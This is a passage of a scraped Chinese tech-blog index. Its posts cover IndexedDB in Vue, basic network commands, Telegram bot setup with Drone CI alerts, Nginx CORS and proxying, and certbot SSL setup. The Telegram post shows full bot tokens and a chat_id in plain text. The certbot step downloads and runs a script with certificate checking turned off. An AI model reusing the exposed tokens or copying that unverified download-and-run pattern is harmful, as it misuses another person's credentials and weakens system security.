request.objectStore(\u0026#34;chatData\u0026#34;).clear() } chatroom.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ... \u0026lt;script\u0026gt; import * as idb from \u0026#34;@/utils/db\u0026#34; export default { data: { return { msgData: [], historyRange: 0 } } mounted() { setTimeout(() =\u0026gt; { this.getHistory(this.historyRange) }, 500) } methods: { getHistory(num) { if (idb.isSupportDB()) { // 若支援則開啟DB，並待回傳後撈資料 idb.openDB().then(() =\u0026gt; { idb.getHistory(num).then(result =\u0026gt; { setTimeout(() =\u0026gt; { if (!this.msgData.length) { // 未有資料時直接定義 this.msgData = result } else { result.forEach(item =\u0026gt; { // 將撈到的資料由前塞入msgData this.msgData.unshift(item) }) } this.historyRange++ }, 0) }) }) } }, add(data) { idb.addToDB(data) }, clearDB() { idb.clearDB() } } } \u0026lt;/script\u0026gt; ","date":"2022-09-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52351840670_d321f7cc15_o.jpg","permalink":"https://wayneblog.ga/2022-09-12/use-indexeddb/","title":"前端緩存大筆資料：IndexedDB 介紹/應用"},{"content":" 指導教師：黃威誌 使用軟體 Cisco Packet Tracer Cisco官方網路模擬器 CPT下載教學\nwireshark(3.6.0) 封包擷取工具 下載wireshark\nVmware 虛擬機軟體 下載Vmware\n指令筆記 ping 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ### 常用來測試的ip ### 中華電信DNS ping 168.95.1.1 ### Google ping 8.8.8.8 \u0026gt;\u0026gt;\u0026gt; 回覆自 [IP]: 位元組=32 時間=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; 回覆自 [IP]: 位元組=32 時間=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; 回覆自 [IP]: 位元組=32 時間=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; 回覆自 [IP]: 位元組=32 時間=7ms TTL=245 時間: 若連續超過100ms，代表網路有問題 TTL: Time to live ipconfig 查詢電腦網卡設定 ipconfig(Windows) / ifconfig(Linux/UNIX) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ### 基本使用 ipconfig ### 更詳細版本 ipconfig /all ### 查詢參數 ipconfig /? ### 釋放IP位址 ipconfig /release # IPv4 ipconfig /release6 # IPv6 ### 重新取得IP位址 (會造成瞬間斷線) ipconfig /renew # IPv4 ipconfig /renew6 # IPv6 ### 清除DNS快取 ipconfig /flushdns tracert 追蹤連線出去的節點 最多30個節點 1 2 3 4 tracert 168.95.1.1 ### 也可輸入網址 tracert www.pchome.com.tw nslookup 判斷DNS名稱解析伺服器是否正常 1 2 3 4 nslookup 168.95.1.1 ### 也可輸入網址 nslookup www.pchome.com.tw netstat 查詢電腦連線服務的狀態 使用port：7 1 2 3 4 netstat ### 列出目前所有的網路狀態(包含IPv6) netstat -an Cisco Packet Tracer 設定Router 範例使用的設備\nRouters: 1841 router Connections: RS 232 Devices: PC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ### 進入router Router\u0026gt; enable Router# ### 進入privey config Router# configure terminal Router(config)# ### 設定 hostname (範例設定為\u0026#34;ISP_1\u0026#34;) Router(config)# hostname ISP_1 ### 設定網卡介面 (範例設定為\u0026#34;fastEthernet 0/0\u0026#34;) ISP_1(config)# interface fastEthernet 0/0 ISP_1(config-if)# ### 設定IP ISP_1(config-if)# ip address 192.168.0.5 255.255.255.0 ISP_1(config-if)# ### 離開並查看IP設定 ISP_1(config-if)# exit ISP_1(config)# exit ISP_1# ISP_1# show running-config Building configuration... Current configuration : 575 bytes ! version 12.4 no service timestamps log datetime msec no service timestamps debug datetime msec no service password-encryption ! hostname ISP_1 ! ! ! ! ! ! ! ! ip cef no ipv6 cef ! ! --More-- Wireshark 防火牆概念 FTP 使用TCP通訊協定 使用port：21(命令傳輸)、20(檔案傳輸) 近期已較不常使用，因安全性問題 SSH(secure shell) 使用TCP通訊協定 用於登入系統、傳輸指令 加密傳輸 使用port：22 telnet 使用TCP通訊協定 用於文字命令 無加密 使用port：23 SMTP(simple mail transfer protocal) 使用DNS Server的MX Record 用於寄出mail 使用TCP通訊協定 使用port：25 對寄件者身分不做驗證，只會驗證收件者 現今已較少使用，通常已改使用網頁式的mail，較於安全且減省資源 POP3 用來接收mail、遠端管理郵件，可以單純下載，伺服器端不需刪除 採用不加密通訊 新版(POP3S)採取加密通訊 使用TCP通訊協定 使用port：110 WHOIS 用於查詢網際網路中網域名稱IP與所有者的資訊 使用TCP通訊協定 使用port：43 DNS(domain name system) 用於網域名稱與IP的對應查詢 同時使用TCP/UDP通訊協定 使用port：53 HTTP(hypertext transfer protocol) 網頁的發布和接收 使用TCP通訊協定 使用port：80 (8080為替代port) IMAP 用於線上和離線狀態的瀏覽模式 使用TCP通訊協定 使用port：143 (8080為替代port) ","date":"2022-09-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52351384271_09abac0c54_o.jpg","permalink":"https://wayneblog.ga/2022-09-12/network-management-lesson/","title":"網路管理技術應用實務班筆記"},{"content":" 參考網站 - Telegram 聊天機器人原理\n參考網站 - 向 @BotFather 申請一隻機器人吧！\n參考網站 - Telegram 機器人的設定\n參考網站 - CI/CD trigger WebHook to Telegram Bot\n參考網站 - How to setup a Telegram bot for your Drone CI/CD builds\nTelegram 聊天機器人原理 機器人的運作原理 現在你發了一段訊息給機器人\n但是並不是機器人直接回你訊息\n詳細情況如下圖：\n一開始你的訊息會被傳送到 TG 伺服器 TG 伺服器會通知機器人：欸！有一則新訊息 機器人會發一個指令給 TG 伺服器 TG 伺服器照著指令的需求，回應訊息給你 機器人接收訊息的兩種模式 機器人可以放在伺服器，也可以用客戶端的方式運作\nWebhook\n以 伺服器 方式被動接收訊息，需要有 IP 位置，通常會放在 網站伺服器(Web Hosting) 上，要自己架設網站伺服器不是件容易的事，所以官方還提供了另一種做法 Long Polling。\n以 客戶端 方式主動跟 TG 伺服器要訊息，可以直接 在自己電腦上運作，不需要架(租)伺服器也能讓機器人順利運作，缺點就是電腦要一直開著，當然你也可以使用 雲端服務(IaaS、PaaS、SaaS)。 機器人發送訊息的三種方式 HTTP GET 1 https://api.telegram.org/bot{Token}/{Method}?{Parameter1}={Value1}\u0026amp;{Parameter2}={Value2} 直接以 網址參數 的方式傳送指令，GET 沒有 Body，只傳送 Headers (你可以當作不會傳送檔案過去)，通常是用來取資料用，優點是可以直接用瀏覽器執行，缺點是有 2KB 的限制，雖然不太可能用到這長的指令，但還是比較建議使用 POST。\nHTTP POST 1 {\u0026#34;method\u0026#34;:\u0026#34;Method\u0026#34;,\u0026#34;Parameter1\u0026#34;:\u0026#34;Value1\u0026#34;,\u0026#34;Parameter2\u0026#34;:\u0026#34;Value2\u0026#34;} POST 是 以 Body 傳送資料(檔案)，程式通常都是以這種方式溝通，網頁裡的表單也經常是以這種方式傳送，資料不會顯示在網址列，可以傳送的資料大小比 GET 大得多：1MB ~ 2GB。\n直接 Print 這個方式 只有在 webhook 模式 下才能使用，因為只有伺服器可以直接回應訊息。\n向 @BotFather 申請一隻機器人吧！ The BotFather The Botfather 這個名字是致敬 1972 年的美國電影《教父》\n它是機器人，也是機器人的管理者\n幾乎所有機器人的設定、建立都要透過他\n用機器人設定機器人聽起來就很有趣，對吧？\n@BotFather 的功能 私訊 @BotFather ，按「開始」後就會顯示出一大堆指令，真是令人眼花撩亂\n官方網頁版說明\n簡單介紹幾個比較常用的功能：\n指令 說明 /newbot 建立一個新的機器人 /mybots 列出所有機器人，用按鈕的方式設定機器人，而非指令（這樣可以讓聊天紀錄變得很乾淨，我比較喜歡用這個） 修改相關 /setname 修改顯示名稱 /setdescription 修改說明 /setabouttext 修改簡介 /setuserpic 修改大頭貼 /setcommands 修改指令選單 /deletebot 刪除機器人 設定相關 /token 顯示機器人的 token /revoke 產生新的 token，舊的會失效 /setjoingroups 設定是否能被加入群組 /setprivacy 設定是否能讀取所有聊天室訊息（機器人的訊息除外，機器人不論如何都不會看到機器人的訊息） 建立你的機器人吧 輸入 /newbot 指令 幫機器人取名字 1 Alright, a new bot. How are we going to call it? Please choose a name for your bot. 這邊它會要你幫你的機器人取一個名字，這個以後能修改，所以隨便取沒差\n設定 username 1 Good. Now let\u0026#39;s choose a username for your bot. It must end in `bot`. Like this, for example: TetrisBot or tetris_bot. ⚠️ 注意：設定後就不能修改了，請謹慎思考之後設定，避免反悔時需要請使用者遷移\n需要幫你的機器人設定一個 username，必須符合以下規則：\n不需要打 @ 以 a~z 開頭 以 bot 結尾 只能使用 a~z、0~9 和底線 最小長度為 5 個字元 顯示時會區分大小寫，使用時不區分大小寫（例如設定成 @TetrisBot，用 @tETrISbOt 一樣會指到同一個機器人）\n常見問題：\n不能以數字開頭 1 Sorry, this username is invalid. 不能用 bot 以外的字結尾 1 Sorry, the username must end in \u0026#39;bot\u0026#39;. E.g. \u0026#39;Tetris_bot\u0026#39; or \u0026#39;Tetrisbot\u0026#39; username 已經被別人先用走了 1 Sorry, this username is already taken. Please try something different. 出現 Done 表示你設定成功了\n使用你的機器人吧 現在你已經可以使用機器人了\n按下說明裡的連結(t.me/ironman2021_by_miku3920_bot 點你自己的)，並且點擊「開始」\n然後你就會發現什麼事情都沒發生，因為我們還沒寫機器人的程式嘛\n不過就算不寫程式也可以讓它說話，利用 HTTP GET 方法，與 sendMessage 這個 API\n1 https://api.telegram.org/bot{Token}/{Method}?{Parameter1}={Value1}\u0026amp;{Parameter2}={Value2} Token：1985044907:AAEdySrbzTc8tVdBjfymlfyaBUJGeu7r-v4（你的 bot token） Method：sendMessage Parameter1：chat_id Value1：127355800（你的 uid，可以透過 @userinfobot 取得） Parameter2：text Value2：Hello,+World!+你好，世界！（空白要用「+」替換） 組合完會像這個樣子，直接貼到瀏覽器的網址列就能使用囉：\n1 https://api.telegram.org/bot1985044907:AAEdySrbzTc8tVdBjfymlfyaBUJGeu7r-v4/sendMessage?chat_id=127355800\u0026amp;text=Hello,+World!+你好，世界！ PS：聊天室的 chat_id，先將你的機器人邀請進入聊天室，再使用此網址取得：https://api.telegram.org/bot${your_bot_token}/getUpdates\n常見問題：\nToken 打錯 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:401,\u0026#34;description\u0026#34;:\u0026#34;Unauthorized\u0026#34;} Method 打錯 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:404,\u0026#34;description\u0026#34;:\u0026#34;Not Found\u0026#34;} chat_id 的值不能為空 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: chat_id is empty\u0026#34;} chat_id 的值打錯 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: chat not found\u0026#34;} 沒私訊過機器人 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:403,\u0026#34;description\u0026#34;:\u0026#34;Forbidden: bot can\u0026#39;t initiate conversation with a user\u0026#34;} text 的值不能為空 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: message text is empty\u0026#34;} 成功的話會返回機器人發送的訊息（json 格式）到網頁上：\n1 {\u0026#34;ok\u0026#34;:true,\u0026#34;result\u0026#34;:{\u0026#34;message_id\u0026#34;:5,\u0026#34;from\u0026#34;:{\u0026#34;id\u0026#34;:1985044907,\u0026#34;is_bot\u0026#34;:true,\u0026#34;first_name\u0026#34;:\u0026#34;2021 iThome\\u9435\\u4eba\\u8cfd\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;ironman2021_by_miku3920_bot\u0026#34;},\u0026#34;chat\u0026#34;:{\u0026#34;id\u0026#34;:127355800,\u0026#34;first_name\u0026#34;:\u0026#34;\\u521d\\u97f3\u0026#34;,\u0026#34;last_name\u0026#34;:\u0026#34;\\u30df\\u30af\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;miku3920\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;private\u0026#34;},\u0026#34;date\u0026#34;:1631440402,\u0026#34;text\u0026#34;:\u0026#34;Hello, World! \\u4f60\\u597d\\uff0c\\u4e16\\u754c\\uff01\u0026#34;}} Telegram 機器人的設定 輸入 /mybots 指令後就會出現機器人列表\n1 Choose a bot from the list below: 選擇一個你要查看或設定的機器人\n我之前就有建立過機器人，所以會顯示兩個\n1 2 Here it is: 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. What do you want to do with the bot? 點下去後就會出現六個選項，我一個個來講解：\nAPI Token - 查看 token 1 2 3 Here is the token for bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot: 1985044907:AAH1kZaEZFHoA6YqB6IFtvbkyOjvcpPOfbQ 忘記 token 時可以來這裡查看，或是你想要重置 token\nRevoke current token - 重置 token 1 2 3 Token for the bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot has been revoked. New token is: 1985044907:AAG3E05XowN2sqy286aplwr6oBc17q0CByg 按下重置按鈕後，它就會給你一個新的 token，舊的會立即失效\nEdit Bot - 修改機器人 1 2 3 4 5 6 7 Edit @ironman2021_by_miku3920_bot info. Name: 2021 iThome鐵人賽 Description: ? About: ? Botpic: ? no botpic Commands: no commands yet Edit Name - 修改名字 按下按鈕後會出現以下訊息\n1 OK. Send me the new name for your bot. 直接傳送新的名稱給它就行了\n1 Success! Name updated. /help 看到這個就是修改成功了\nEdit Description - 修改說明 這個會顯示在聊天室的最上方，用來說明機器人有能些功能，或是如何使用\n1 OK. Send me the new description for the bot. People will see this description when they open a chat with your bot, in a block titled \u0026#39;What can this bot do?\u0026#39;. 傳送一段訊息給它，可以是多行的文字\n1 Success! Description updated. /help 看到這個就是修改成功了\n原本在聊天室上方啥都沒有，現在多了一個訊息框\nEdit About - 修改簡介 這個會顯示在機器人的個人資訊頁面上\n1 OK. Send me the new \u0026#39;About\u0026#39; text. People will see this text on the bot\u0026#39;s profile page and it will be sent together with a link to your bot when they share it with someone. 傳送一段訊息給它，可以是多行的文字\n1 Success! About section updated. /help 看到這個就是修改成功了\n原本是只有顯示 username，現在多了 簡介\nEdit Botpic - 修改大頭貼 1 OK. Send me the new profile photo for the bot. 建議先裁切成正方形（1：1）\n1 Please send me the picture as a \u0026#39;Photo\u0026#39;, not as a \u0026#39;File\u0026#39;. 這邊要傳送照片，不能傳檔案\n1 Success! Profile photo updated. /help 成功的話，機器人的大頭貼就會更新成剛剛上傳的圖片\nEdit Commands - 修改指令選單 1 2 3 4 5 6 OK. Send me a list of commands for your bot. Please use this format: command1 - Description command2 - Another description Send /empty to keep the list empty. 要按照它給的格式輸入，不需要打 /\n1 Success! Command list updated. /help 成功的話，選單中就會出現剛剛設定的指令\n如果機器人是在群組使用，建議改成空的，避免誤觸\n群組裡較常使用 ! 開頭的指令，這樣才不會變成藍藍的容易按到\n在剛剛那邊，按 /empty 就行了\n修改完會變成這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 Edit @ironman2021_by_miku3920_bot info. Name: 2021 iThome鐵人賽 Description: 一些說明文字，功能如下： 1. AAA 2. BBB 3. CCC About: 鐵人賽展示用機器人 by @miku3920 鐵人賽展示用機器人 by @miku3920 鐵人賽展示用機器人 by @miku3920 Botpic: ? has a botpic Commands: no commands yet Bot Settings - 設定機器人 1 Settings for @ironman2021_by_miku3920_bot. Inline Mode - 內聯模式（內嵌模式） 可以讓機器人直接在訊息輸入框使用，不需要將機器人加入群組\n這個功能夠講一整天了，目前還用不到，我們以後專門找一天來講\nAllow Group? - 是否能被加入群組? 1 2 3 Groups are currently enabled for bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot Disabling groups will forbid users to add 2021 iThome鐵人賽 to groups. enabled(預設) - 表示機器人能被別人拉進群組\n如果你不想讓別人拉你的機器人，可以按 Turn groups off\n1 2 3 Groups are currently disabled for bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. Enabling groups will allow users to add 2021 iThome鐵人賽 to groups. disabled - 表示機器人不能被別人拉進群組\n如果你想讓別人的群組也能使用你的機器人，就按 Turn groups on\nGroup Privacy - 是否能讀取所有聊天室訊息 官方說明\n1 Privacy mode is enabled for 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. enabled(預設) - 表示機器人是成員時不能讀取群組裡的所有訊息\n機器人只看的到它的指令和回覆它的訊息\n但是如果升級成管理員就沒這限制\n1 Privacy mode is disabled for 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. disabled - 表示機器人就算不是管理員也能讀取群組裡的所有訊息\n機器人是成員時就能讀取所有訊息\nPayments - 付款相關設定 台灣不能用，有生之年系列，跳過\nDomain - 網站登入用 與機器人較無關，暫時不提\nPayments - 付款相關設定 歐付寶、綠界、台灣 pay、街口、悠遊付，不考慮進駐一下嗎\nTransfer Ownership - 轉移機器人 ⚠️ 注意：非必要請勿使用！\nChoose recipient - 選擇使用者 1 Please share the new owner\u0026#39;s contact or their username. 按下按鈕後，它會請你把對方以聯絡人的方式分享給它，或是輸入對方的 username\n常見問題：\n要輸入 @username，不能只輸入 username 1 Incorrect format. Please make sure to send either a contact or username. 不能轉移給頻道、機器人、或是自己 1 Bot ownership can\u0026#39;t be transferred to channel, another bot or yourself. 對方要私訊過機器人，而且不能封鎖機器人 1 Oops! Please make sure the new owner has sent at least one message to the bot and didn\u0026#39;t block it. 輸入正確的話，就會出現以下訊息：\n1 2 3 4 5 You are about to transfer ownership of the bot @ironman2021_by_miku3920_bot to 初音 ミク. After this you won\u0026#39;t be able to control the bot anymore. The new owner will get access to the bot messages and other data – and can even delete the bot completely. Please make sure you don\u0026#39;t violate your users\u0026#39; privacy (consider GDPR and other laws). If you are sure please press the button below. 看到這則訊息代表離成功轉移不遠了\nYes, I am sure, proceed. - 確認轉移 如果你有設定兩步驟驗證的話，這邊會跳出來要你輸入\n常見問題：\n對方擁有的機器人數量已達上限 1 Oops! has reached the maximum allowed number of bots. Please ask them to delete (or pass to another account) one of their unused bots first. 如果對方已經有 20 隻機器人（達到上限），就會出現這個對話框，他請你先叫對方轉移或刪除一些沒在用的機器人，這樣你才可以轉移給對方。\n1 It worked! We hope @ironman2021_by_miku3920_bot will enjoy its new home. 如果轉移成功就會出現這則訊息\n1 2 3 Ownership of the bot @ironman2021_by_miku3920_bot has been transferred to you by 初音 ミク. You can now control the bot using /mybots. If you did not request this, you can delete the bot. Delete Bot - 刪除機器人 ⚠️ 注意：非必要請勿使用！\n1 You are about to delete your bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. Is that correct? 這邊的按鈕順序是隨機的，避免你頭腦不清楚把機器人刪了\n1 Are you TOTALLY sure you want to delete 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot ? 要連續按兩次 Yes 機器人才會被刪掉\n1 You have deleted 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. 看到這則訊息表示機器人已經刪除，無法復原\n所有群組裡的這隻機器人都會顯示成 Deleted Account\nBonus：Drone CI/CD 流程失敗時，叫你的 Telegram 機器人通知你！ 建立群組，並取得群組的 chat_id Telegram 建立群組，並將你的 Telegram 機器人拉進群組內(@{your bot username})。 透過此 API 取得群組的 chat_id： 1 https://api.telegram.org/bot${your bot token}/getUpdates getUpdates API 會取得 json，找到你剛剛開的群組的 chat_id\n透過 Drone Plugin 從 Drone Plugin 可以找到很多套件，可以搭配 CI/CD 使用，而我從這找到 Telegram by appleboy 的套件。\nDrone CI/CD 補上告警的 step。 你的 Drone CI/CD step 加上使用 Telegram by appleboy 叫你的機器人於 pipeline 失敗時於群組內發出告警。\nPS：記得將你的 telegram bot token 與群組的 chat_id 加到 Drone Secrets。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 kind: pipeline type: docker name: install and deploy steps: - name: build image: node:15 commands: - node --version - yarn --version # - yarn cache clean -f - yarn install --ignore-engines - yarn run build - ls -al dist/static/ when: branch: - master event: - push - name: deploy image: thegeeklab/drone-s3-sync settings: bucket: xxxxxxxxx(你的aws s3 bucket) access_key: from_secret: aws_access_key_id secret_key: from_secret: aws_secret_access_key source: ./dist/ target: /admin acl: \u0026#34;*\u0026#34;: public-read region: xxxxxxxxx(你的aws s3 region) delete: true cloudfront_distribution: xxxxxxxxx(你的aws cloudfront distribution) when: branch: - master event: - push + - name: send telegram notification + image: appleboy/drone-telegram + settings: + token: + from_secret: telegram_bot_token + to: + from_secret: telegram_chat_id + format: markdown + message: \u0026gt; + `{{repo.name}}` 於 `{{commit.branch}}` 編譯失敗：#`{{build.number}}` + when: + status: [failure] token： 你的 Telegram 機器人的 token。 to： chat_id。 format： 使用 markdown 格式。 message： 機器人傳的訊息。 when.status [failure]： 當此 pipeline 失敗時觸發此 step(send telegram notification)，亦可於成功或失敗皆告警：[success, failure]。 詳細參數可參考 Drone Plugin - appleboy/drone-telegram\n","date":"2022-08-25T00:00:00Z","image":"https://live.staticflickr.com/65535/52309739568_a0d98a6137_o.png","permalink":"https://wayneblog.ga/2022-08-25/drone-cicd-with-telegram-bot/","title":"Telegram 機器人說明，並為你的 Drone CI/CD 配置 Telegram 機器人"},{"content":" 參考文章 CORS跨域與Nginx反向代理 CORS on Nginx Nginx解决CORS跨域解决方案 在 Nginx 的 ProxyPass Upstream 設定 CORS （跨來源資源共享） CORS跨域 跨域資源共享 - CORS 跨域資源共享(CORS)是一種機制，它使用額外的 HTTP 頭來告訴瀏覽器，讓運行在一個 origin (domain) 上的Web應用被准許訪問來自不同源服務器上的指定的資源。當一個資源從與該資源本身所在的服務器不同的域、協議或端口請求一個資源時，資源會發起一個跨域 HTTP 請求。\n比如，站點 http://domain-a.com 的某 HTML 頁面通過 \u0026lt;img\u0026gt; 的 src 請求 http://domain-b.com/image.jpg。網絡上的許多頁面都會加載來自不同域的CSS樣式表，圖像和腳本等資源。\n出於安全原因，瀏覽器限制從腳本內發起的跨源HTTP請求。例如，XMLHttpRequest和Fetch API遵循同源策略。這意味著使用這些API的Web應用程序只能從加載應用程序的同一個域請求HTTP資源，除非響應報文包含了正確CORS響應頭。\n跨域時部分瀏覽器預設不攜帶cookie，因此為了攜帶cookie需要在前端設定xmlhttprequest的withCrendetalls屬性。 「同源」定義 「同源」定義很簡單，以下三個參數都相同：\n1 [protocol]://[domain]:[port] 白話說，當你在 https://www.example.com/product.html 頁面\n嘗試對以下路徑發出請求，都違反同源：\nhttp://www.example.com/api/products/40.json https://www.example2.com/api/products/40.json https://www.example.com:8080/api/products/40.json 乖孩子遵守同源，不會被打：\nhttps://www.example.com/api/products/40.json 簡單請求和複雜請求 簡單請求與複雜請求的差別是複雜請求會自動發出一個 OPTIONS 的預檢請求，當請求得到確認後，才開始真正發送請求。\n綜上，我們要解決兩個問題：\nOPTIONS 請求的正確響應 跨域請求正確響應 OPTIONS 請求的正確響應 參考網址\n解決的方式有多種，既可以在Web Server解決，也可以在源碼層解決。因為問題比較普遍，故我們選擇在Web Server解決，下面我們以 Nginx 為例，說明解決方案。 假設訪問的地址為 /example , Nginx 配置如下: 1 2 3 4 5 6 7 location /example { proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } 為了解決跨域問題，添加如下內容: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 location /example { + if ($request_method = \u0026#39;OPTIONS\u0026#39;) { + add_header Access-Control-Allow-Origin *; + add_header Access-Control-Max-Age 1728000; + add_header Access-Control-Allow-Methods GET,POST,OPTIONS; + add_header Access-Control-Allow-Headers \u0026#39;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range\u0026#39;; + add_header Content-Type\u0026#39; \u0026#39;text/plain; charset=utf-8\u0026#39;; + add_header Content-Length 0 ; + return 204; + } proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } 說明： if ($request_method = 'OPTIONS') {...} 當請求方法為 OPTIONS 時:\n添加允許源 Access-Control-Allow-Origin 為 * (可根據業務需要更改) 添加緩存時長 Access-Control-Max-Age，當下次請求時，無需再發送 OPTIONS 請求 添加允許的方法，允許的首部 添加一個內容長度為0，類型為 text/plain; charset=utf-8 , 返回狀態碼為 204 的首部 至此，完成 OPTIONS 請求的正確響應。\n跨域請求正確響應 添加如下內容:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 location /example { if ($request_method = \u0026#39;OPTIONS\u0026#39;) { add_header Access-Control-Allow-Origin *; add_header Access-Control-Max-Age 1728000; add_header Access-Control-Allow-Methods GET,POST,OPTIONS; add_header Access-Control-Allow-Headers \u0026#39;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range\u0026#39;; add_header Content-Type\u0026#39; \u0026#39;text/plain; charset=utf-8\u0026#39;; add_header Content-Length 0 ; return 204; } + if ($http_origin ~* (https?://(.+\\.)?(example\\.com$))) { + add_header Access-Control-Allow-Origin $http_origin; + add_header Access-Control-Allow-Credentials true; + add_header Access-Control-Allow-Methods GET,POST,OPTIONS; + add_header Access-Control-Expose-Headers Content-Length,Content-Range; + } proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } 說明： if ($http_origin ~* (https?://(.+\\.)?(example\\.com$))) {...}，當 origin 為合法域名(可根據業務調整或去除合法域名驗證)時:\n添加允許源 Access-Control-Allow-Origin 為 $http_origin (可根據業務需要更改) 添加允許認證 Access-Control-Allow-Credentials 為 true ，允許接收客戶端 Cookie(可根據業務需要更改。 但要注意，當設置為true時，Access-Control-Allow-Origin 不允許設置為 *) 添加允許的方法，暴露的首部 至此，完成跨域請求正確響應。\n以上，是對跨域請求在Web Server的解決方案，主要是通過響應 OPTIONS 方法和添加允許源來解決。\n當然，如果本地開發中，可以在利用 webpack-dev-server 的 proxy 選項來快速解決跨域問題：\n示例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 // webpack.congf.js module.exports = { //... devServer: { proxy: { \u0026#39;/api\u0026#39;: { target: \u0026#39;http://localhost:3000\u0026#39;, pathRewrite: {\u0026#39;^/api\u0026#39; : \u0026#39;\u0026#39;} } } } } 當訪問地址如 /api/foo?q=bar 時，則通過代理訪問的實際地址是: http://localhost:3000/foo?q=bar。\nNginx反向代理 nginx反向代理，通過修改nginx配置檔案實現反向代理，請求統一通過nginx分發請求\nNginx配置（192.168.75.139） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # 負載均衡 upstream my_site { server 192.168.75.138:8080; server 192.168.75.137:8080; server 192.168.75.136:8080; } server { listen 8081; server_name localhost; location ^~ /api/ { proxy_pass http://my_site/; proxy_set_header Host $host; proxy_set_header X-Real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location = / { proxy_pass http://my_site/nginx/indexNginxCrossQuest.jsp; } location = /nginx/ { proxy_pass http://my_site/nginx/; proxy_set_header Host $host; proxy_set_header X-Real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location ~ \\.(html|htm|ico|png|jpg|jpeg|js|css|bmp)$ { proxy_pass http://my_site; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } 瀏覽器請求（192.168.75.1） 綜合對比 CORS Nginx反向代理 前端程式碼配置 credentials=true 無 後端程式碼配置 setHeader：Allow-Origin、Allow-Methods等 無 服務端配置 無 Nginx配置 移植靈活性 高、無額外配置 低、每增加一個環境都需要增加配置 安全性 高、來源可控、直接追溯 X-Forwarded-For追溯多級來源 安全控制 黑白名單 更新配置 ","date":"2022-08-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52305241864_c3ef911be4_o.jpg","permalink":"https://wayneblog.ga/2022-08-23/nginx-cors-and-reverse-proxy/","title":"nginx CORS 跨域與反向代理"},{"content":" 參考文章 IT Note SSL憑證教學 - xoops 免費SSL憑證申請 nginx config產生器 Qualys 的 SSL 伺服器測試工具 版本一 步驟 1 - 下載安裝及執行的腳本 1 2 3 wget https://dl.eff.org/certbot-auto --no-check-certificate chmod +x ./certbot-auto ./certbot-auto -n 生成證書，只需要輸入郵件地址和網站根目錄，提示以下內容，說明安裝完成 1 2 3 Saving debug log to /var/log/letsencrypt/letsencrypt.log Missing command line flags. For non-interactive execution, you will need to specify a plugin on the command line. Run with \u0026#39;--help plugins\u0026#39; to see a list of options, and see https://eff.org/letsencrypt-plugins for more detail on what the plugins do and how to use them. 步驟 2 - nginx設定隱藏目錄訪問 1 2 3 location ~ /.well-known { allow all; } 步驟 3 - 生成域名證書 1 ./certbot-auto certonly --email tony@hack.idv.tw --agree-tos --no-eff-email --webroot -w /var/www/ -d hack.idv.tw 到目錄內查看 1 cd /etc/letsencrypt/live/ 萬用字元的申請指令 (需要驗證dns) 1 certbot-auto certonly -d *.manpc.tk --manual --preferred-challenges dns 步驟 4 - 設定nginx 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 server { listen 80; # 